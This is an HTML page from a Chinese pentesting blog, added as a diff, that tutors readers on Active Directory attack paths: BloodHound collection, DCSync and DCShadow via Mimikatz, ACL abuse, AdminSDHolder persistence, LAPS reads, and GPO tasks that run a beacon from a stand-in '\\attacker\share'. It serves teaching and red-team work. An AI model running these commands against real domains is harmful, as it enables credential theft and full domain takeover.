@@ -1,0 +1,554 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 8.1.2">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"congliang.github.io","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.27.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"}}</script><script src="/js/config.js" defer></script>
+
+    <meta name="description" content="一、概述Active Directory（AD）是企业内网的核心身份基础设施。攻击者突破边界后，AD即成为横向移动与权限提升的主战场。本文系统梳理从信息收集到持久化的完整攻击路径，涵盖BloodHound&#x2F;SharpHound采集、DCSync&#x2F;DCShadow、ACL滥用、GPO分发、AdminSDHolder持久化、LAPS密码读取、域信任利用及RODC攻击。 flowch">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Active Directory攻击路径">
+<meta property="og:url" content="https://congliang.github.io/Intranet-AD-attack-path/">
+<meta property="og:site_name" content="渗透测试实战记录">
+<meta property="og:description" content="一、概述Active Directory（AD）是企业内网的核心身份基础设施。攻击者突破边界后，AD即成为横向移动与权限提升的主战场。本文系统梳理从信息收集到持久化的完整攻击路径，涵盖BloodHound&#x2F;SharpHound采集、DCSync&#x2F;DCShadow、ACL滥用、GPO分发、AdminSDHolder持久化、LAPS密码读取、域信任利用及RODC攻击。 flowch">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-06-05T00:00:00.000Z">
+<meta property="article:modified_time" content="2026-06-04T15:34:45.895Z">
+<meta property="article:author" content="YunShang">
+<meta property="article:tag" content="内网渗透">
+<meta property="article:tag" content="工具">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+
+
+<link rel="canonical" href="https://congliang.github.io/Intranet-AD-attack-path/">
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://congliang.github.io/Intranet-AD-attack-path/","path":"Intranet-AD-attack-path/","title":"Active Directory攻击路径"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>Active Directory攻击路径 | 渗透测试实战记录</title>
+  
+
+
+
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
+  <script src="/js/third-party/tags/mermaid.js" defer></script>
+
+
+
+
+
+  
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">渗透测试实战记录</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">边学边记</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
+  </ul>
+</nav>
+
+
+
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E6%A6%82%E8%BF%B0"><span class="nav-number">1.</span> <span class="nav-text">一、概述</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81BloodHound-SharpHound-%E6%95%B0%E6%8D%AE%E9%87%87%E9%9B%86"><span class="nav-number">2.</span> <span class="nav-text">二、BloodHound &#x2F; SharpHound 数据采集</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81DCSync-%E6%94%BB%E5%87%BB"><span class="nav-number">3.</span> <span class="nav-text">三、DCSync 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81DCShadow-%E6%94%BB%E5%87%BB"><span class="nav-number">4.</span> <span class="nav-text">四、DCShadow 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81ACL%E6%BB%A5%E7%94%A8%EF%BC%9AGenericWrite-%E4%B8%8E-WriteDacl"><span class="nav-number">5.</span> <span class="nav-text">五、ACL滥用：GenericWrite 与 WriteDacl</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#5-1-GenericWrite-%E5%88%A9%E7%94%A8"><span class="nav-number">5.1.</span> <span class="nav-text">5.1 GenericWrite 利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-2-WriteDacl-%E5%88%A9%E7%94%A8"><span class="nav-number">5.2.</span> <span class="nav-text">5.2 WriteDacl 利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81GPO%E7%AD%96%E7%95%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E5%8F%91"><span class="nav-number">6.</span> <span class="nav-text">六、GPO策略恶意软件分发</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81AdminSDHolder-%E6%8C%81%E4%B9%85%E5%8C%96"><span class="nav-number">7.</span> <span class="nav-text">七、AdminSDHolder 持久化</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81LAPS-%E5%AF%86%E7%A0%81%E8%AF%BB%E5%8F%96"><span class="nav-number">8.</span> <span class="nav-text">八、LAPS 密码读取</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81%E5%9F%9F%E4%BF%A1%E4%BB%BB%E5%88%A9%E7%94%A8"><span class="nav-number">9.</span> <span class="nav-text">九、域信任利用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81RODC-%E6%94%BB%E5%87%BB"><span class="nav-number">10.</span> <span class="nav-text">十、RODC 攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81%E6%A3%80%E6%B5%8B%E4%B8%8E%E9%98%B2%E5%BE%A1"><span class="nav-number">11.</span> <span class="nav-text">十一、检测与防御</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-number">12.</span> <span class="nav-text">十二、总结</span></a></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">YunShang</p>
+  <div class="site-description" itemprop="description">渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">127</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">分类</span>
+      </div>
+      <div class="site-state-item site-state-tags">
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/congliang" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;congliang" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:yunshang0069@126.com" title="E-Mail → mailto:yunshang0069@126.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://congliang.github.io/Intranet-AD-attack-path/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="YunShang">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="渗透测试实战记录">
+      <meta itemprop="description" content="渗透测试学习笔记 | 靶机实战 Writeup | 安全工具速查">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="Active Directory攻击路径 | 渗透测试实战记录">
+      <meta itemprop="description" content="">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Active Directory攻击路径
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2025-06-05 08:00:00" itemprop="dateCreated datePublished" datetime="2025-06-05T08:00:00+08:00">2025-06-05</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2026-06-04 23:34:45" itemprop="dateModified" datetime="2026-06-04T23:34:45+08:00">2026-06-04</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/pentest/" itemprop="url" rel="index"><span itemprop="name">渗透测试</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><p>Active Directory（AD）是企业内网的核心身份基础设施。攻击者突破边界后，AD即成为横向移动与权限提升的主战场。本文系统梳理从信息收集到持久化的完整攻击路径，涵盖BloodHound&#x2F;SharpHound采集、DCSync&#x2F;DCShadow、ACL滥用、GPO分发、AdminSDHolder持久化、LAPS密码读取、域信任利用及RODC攻击。</p>
+<pre class="mermaid">flowchart TD
+    A[初始立足点] --> B[SharpHound数据采集]
+    B --> C{BloodHound分析}
+    C --> D1[ACL滥用提权]
+    C --> D2[域信任利用]
+    D1 --> E[GenericWrite/WriteDacl]
+    E --> F[DCSync攻击]
+    F --> G[DCShadow/AdminSDHolder持久化]
+    C --> H[GPO恶意分发]
+    C --> I[LAPS密码读取]
+    C --> J[RODC攻击]
+    G --> K[域完全控制]
+    H --> K
+    I --> K
+    J --> K</pre>
+
+<h2 id="二、BloodHound-SharpHound-数据采集"><a href="#二、BloodHound-SharpHound-数据采集" class="headerlink" title="二、BloodHound &#x2F; SharpHound 数据采集"></a>二、BloodHound &#x2F; SharpHound 数据采集</h2><p>BloodHound使用图论分析AD权限关系，揭示隐藏攻击路径。SharpHound是官方数据采集器，通过LDAP查询、SMB会话枚举、ACL收集构建节点关系图谱，低权限用户即可完成大部分采集：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Import-Module</span> .\SharpHound.ps1</span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> All <span class="literal">-ZipFileName</span> output.zip</span><br><span class="line"><span class="comment"># 隐秘模式</span></span><br><span class="line"><span class="built_in">Invoke-BloodHound</span> <span class="literal">-CollectionMethod</span> Session,LoggedOn,<span class="built_in">Group</span>,ACL,Trusts <span class="literal">-Stealth</span></span><br><span class="line"><span class="comment"># C#可执行文件版（更隐蔽）</span></span><br><span class="line"><span class="comment"># SharpHound.exe -c All -d ad.local --zipfilename data.zip</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>关键Cypher查询：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 拥有GenericWrite权限且可到达Domain Admins的用户</span><br><span class="line">MATCH (u:User)-[r:GenericWrite]-&gt;(c:Computer)</span><br><span class="line">MATCH p=shortestPath((c)-[*1..]-&gt;(g:Group &#123;name:&#x27;DOMAIN ADMINS@AD.LOCAL&#x27;&#125;))</span><br><span class="line">RETURN u.name, c.name, length(p) AS distance</span><br></pre></td></tr></table></figure>
+
+<h2 id="三、DCSync-攻击"><a href="#三、DCSync-攻击" class="headerlink" title="三、DCSync 攻击"></a>三、DCSync 攻击</h2><p>DCSync利用MS-DRSR协议模拟域控制器向DC请求复制数据。攻击者需持有<code>DS-Replication-Get-Changes</code>和<code>DS-Replication-Get-Changes-All</code>扩展权限。</p>
+<pre class="mermaid">flowchart LR
+    A[攻击主机] -->|Mimikatz DCSync| B[域控制器]
+    B -->|返回NTLM Hash| A
+    A -->|Pass-the-Hash| C[横向移动]
+    A -->|Golden Ticket| D[伪造TGT]
+    A -->|Silver Ticket| E[伪造TGS]</pre>
+
+<p><strong>攻击实施：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Mimikatz拉取krbtgt哈希</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ad.local /user:krbtgt</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 拉取所有用户哈希</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcsync /domain:ad.local /all /csv</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Impacket从非域Linux主机发起</span></span><br><span class="line">python3 secretsdump.py ad.local/user:pass@dc.ad.local -just-dc-user krbtgt</span><br></pre></td></tr></table></figure>
+
+<p><strong>获取DCSync权限的路径：</strong> Domain Admins成员、Exchange Windows Permissions组（默认WriteDacl）、或手动授予：</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=ad,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> DCSync</span><br></pre></td></tr></table></figure>
+
+<h2 id="四、DCShadow-攻击"><a href="#四、DCShadow-攻击" class="headerlink" title="四、DCShadow 攻击"></a>四、DCShadow 攻击</h2><p>DCShadow是DCSync的逆向攻击：将攻击主机临时注册为伪DC，主动向真实DC推送恶意数据——篡改账户属性、组成员关系、ACL或SID History。由Benjamin Delpy和Vincent Le Toux在2018年公开。</p>
+<pre class="mermaid">sequenceDiagram
+    participant A as 攻击者主机
+    participant DC as 真实域控制器
+    participant AD as AD数据库
+    A->>DC: 注册SPN伪装为DC
+    A->>AD: 推送恶意对象变更（AdminSDHolder ACL/SID History）
+    A->>DC: 取消注册并清除痕迹</pre>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 步骤1：目标主机以SYSTEM运行</span></span><br><span class="line">mimikatz <span class="comment"># !+</span></span><br><span class="line">mimikatz <span class="comment"># !processtoken</span></span><br><span class="line"><span class="comment"># 步骤2：推送恶意变更</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcshadow /object:CN=Administrator,CN=Users,DC=ad,DC=local /attribute:primaryGroupID /value:512</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcshadow /push</span></span><br><span class="line"><span class="comment"># 注入SID History持久化</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcshadow /object:CN=attacker,CN=Users,DC=ad,DC=local /attribute:sidhistory /value:S-1-5-21-...-500</span></span><br><span class="line">mimikatz <span class="comment"># lsadump::dcshadow /push</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>DCShadow需DA权限，通常用于高权限阶段注入隐蔽持久化。</p>
+</blockquote>
+<h2 id="五、ACL滥用：GenericWrite-与-WriteDacl"><a href="#五、ACL滥用：GenericWrite-与-WriteDacl" class="headerlink" title="五、ACL滥用：GenericWrite 与 WriteDacl"></a>五、ACL滥用：GenericWrite 与 WriteDacl</h2><pre class="mermaid">flowchart TD
+    A[GenericWrite] --> B1[写入servicePrincipalName → Kerberoasting]
+    A --> B2[写入msDS-KeyCredentialLink → Shadow Credentials]
+    A --> B3[写入scriptPath → 登录脚本劫持]
+    D[WriteDacl] --> E1[授予DCSync权限]
+    D --> E2[授予GenericAll控制目标]
+    D --> E3[修改对象所有者]</pre>
+
+<h3 id="5-1-GenericWrite-利用"><a href="#5-1-GenericWrite-利用" class="headerlink" title="5.1 GenericWrite 利用"></a>5.1 GenericWrite 利用</h3><p><strong>强制Kerberoasting：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Set-DomainObject</span> <span class="literal">-Identity</span> targetuser <span class="literal">-Set</span> <span class="selector-tag">@</span>&#123;servicePrincipalName=<span class="string">&#x27;fake/NOTHING&#x27;</span>&#125;</span><br><span class="line">Rubeus.exe kerberoast /user:targetuser /outfile:hash.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>Shadow Credentials（msDS-KeyCredentialLink）：</strong></p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whisker.exe add /target:targetuser /domain:ad.local /dc:dc.ad.local</span><br><span class="line">Rubeus.exe asktgt /user:targetuser /certificate:&lt;cert&gt; /password:<span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-WriteDacl-利用"><a href="#5-2-WriteDacl-利用" class="headerlink" title="5.2 WriteDacl 利用"></a>5.2 WriteDacl 利用</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 对目标用户授予GenericAll / DCSync权限</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> targetuser <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> All</span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;DC=ad,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> DCSync</span><br><span class="line"><span class="built_in">Set-DomainObjectOwner</span> <span class="literal">-Identity</span> targetuser <span class="literal">-OwnerIdentity</span> attacker</span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dacledit.py -action write -rights <span class="string">&#x27;FullControl&#x27;</span> -principal attacker -target targetuser ad.local/user:pass</span><br></pre></td></tr></table></figure>
+
+<h2 id="六、GPO策略恶意软件分发"><a href="#六、GPO策略恶意软件分发" class="headerlink" title="六、GPO策略恶意软件分发"></a>六、GPO策略恶意软件分发</h2><p>GPO是AD中最强大的配置分发机制。攻击者获得GPO写入权限后，可大规模分发恶意程序。</p>
+<pre class="mermaid">flowchart LR
+    A[获得GPO写入权限] --> B[SharpGPOAbuse]
+    B --> C1[创建计划任务]
+    B --> C2[添加启动/登录脚本]
+    B --> C3[修改注册表Run键]
+    C1 --> D[域内主机拉取GPO]
+    C2 --> D
+    C3 --> D
+    D --> E[恶意代码以SYSTEM执行]</pre>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SharpGPOAbuse — 计划任务分发恶意程序</span></span><br><span class="line">SharpGPOAbuse.exe <span class="literal">--AddComputerTask</span> <span class="literal">--TaskName</span> <span class="string">&quot;WindowsUpdate&quot;</span> `</span><br><span class="line">    <span class="literal">--Author</span> <span class="string">&quot;NT AUTHORITY\SYSTEM&quot;</span> <span class="literal">--Command</span> <span class="string">&quot;cmd.exe&quot;</span> `</span><br><span class="line">    <span class="literal">--Arguments</span> <span class="string">&quot;/c \\attacker\share\beacon.exe&quot;</span> `</span><br><span class="line">    <span class="literal">--GPOName</span> <span class="string">&quot;Default Domain Policy&quot;</span> <span class="literal">--Force</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 pygpoabuse.py ad.local/user:pass -gpo-id <span class="string">&quot;GPO_GUID&quot;</span> -<span class="built_in">command</span> <span class="string">&#x27;cmd /c \\attacker\share\payload.exe&#x27;</span> -taskname Update</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>GPO刷新间隔默认90±30分钟，可通过<code>gpupdate /force</code>强制应用。</p>
+</blockquote>
+<h2 id="七、AdminSDHolder-持久化"><a href="#七、AdminSDHolder-持久化" class="headerlink" title="七、AdminSDHolder 持久化"></a>七、AdminSDHolder 持久化</h2><p>AdminSDHolder（<code>CN=AdminSDHolder,CN=System</code>）的ACL作为安全模板，由SDProp进程每60分钟强制同步到所有受保护组（Domain Admins、Enterprise Admins、Administrators、krbtgt等）。</p>
+<pre class="mermaid">sequenceDiagram
+    participant Attacker as 攻击者
+    participant ASH as AdminSDHolder
+    participant SP as SDProp(每60分钟)
+    participant PROTECTED as 受保护组
+
+    Attacker->>ASH: 添加恶意ACE(GenericAll)
+    SP->>ASH: 读取模板ACL
+    SP->>PROTECTED: 强制覆盖受保护组ACL
+    Note over PROTECTED: 受保护组被植入后门
+    Attacker->>PROTECTED: 利用GenericAll篡改成员/重置密码</pre>
+
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 向AdminSDHolder添加GenericAll</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CN=AdminSDHolder,CN=System,DC=ad,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> All</span><br><span class="line"><span class="comment"># 或指定精确权限</span></span><br><span class="line"><span class="built_in">Add-DomainObjectAcl</span> <span class="literal">-TargetIdentity</span> <span class="string">&quot;CN=AdminSDHolder,CN=System,DC=ad,DC=local&quot;</span> <span class="literal">-PrincipalIdentity</span> attacker <span class="literal">-Rights</span> ResetPassword,WriteMembers</span><br><span class="line"><span class="comment"># 验证SDProp同步结果</span></span><br><span class="line"><span class="built_in">Get-DomainObjectAcl</span> <span class="literal">-Identity</span> <span class="string">&quot;Domain Admins&quot;</span> <span class="literal">-ResolveGUIDs</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.SecurityIdentifier <span class="operator">-eq</span> <span class="variable">$attackerSID</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>检测：监控Event ID 5136（AdminSDHolder对象修改），非标准ACE添加应立即告警。</p>
+</blockquote>
+<h2 id="八、LAPS-密码读取"><a href="#八、LAPS-密码读取" class="headerlink" title="八、LAPS 密码读取"></a>八、LAPS 密码读取</h2><p>LAPS将每台域内计算机的本地Administrator密码随机化后存储在<code>ms-Mcs-AdmPwd</code>属性中。默认仅Domain Admins可读，但ACL配置错误可能导致低权限用户读取。</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 枚举可读LAPS密码的主机</span></span><br><span class="line"><span class="built_in">Get-DomainComputer</span> | <span class="built_in">Where-Object</span> &#123;<span class="variable">$_</span>.<span class="string">&#x27;ms-Mcs-AdmPwd&#x27;</span> <span class="operator">-ne</span> <span class="variable">$null</span>&#125; | <span class="built_in">Select-Object</span> name,<span class="string">&#x27;ms-Mcs-AdmPwd&#x27;</span></span><br><span class="line"><span class="built_in">Get-ADComputer</span> <span class="literal">-Identity</span> Workstation01 <span class="literal">-Properties</span> ms<span class="literal">-Mcs-AdmPwd</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 laps.py -u user -p pass -d ad.local -dc dc.ad.local</span><br><span class="line">ldapsearch -H ldap://dc.ad.local -D user@ad.local -w pass -b <span class="string">&quot;DC=ad,DC=local&quot;</span> <span class="string">&quot;(ms-Mcs-AdmPwd=*)&quot;</span> ms-Mcs-AdmPwd</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>BloodHound可定位对计算机拥有控制权的用户，通过修改目标ACL间接获取LAPS密码。</p>
+</blockquote>
+<h2 id="九、域信任利用"><a href="#九、域信任利用" class="headerlink" title="九、域信任利用"></a>九、域信任利用</h2><p>域信任连接两个域&#x2F;林的认证边界，跨域攻击核心在于利用信任关系和票据机制突破安全边界。</p>
+<table>
+<thead>
+<tr>
+<th>信任类型</th>
+<th>传递性</th>
+<th>关键攻击方向</th>
+<th>核心技术</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Parent-Child</td>
+<td>双向可传递</td>
+<td>子域→父域</td>
+<td>SID History注入 + Golden Ticket</td>
+</tr>
+<tr>
+<td>Tree-Root</td>
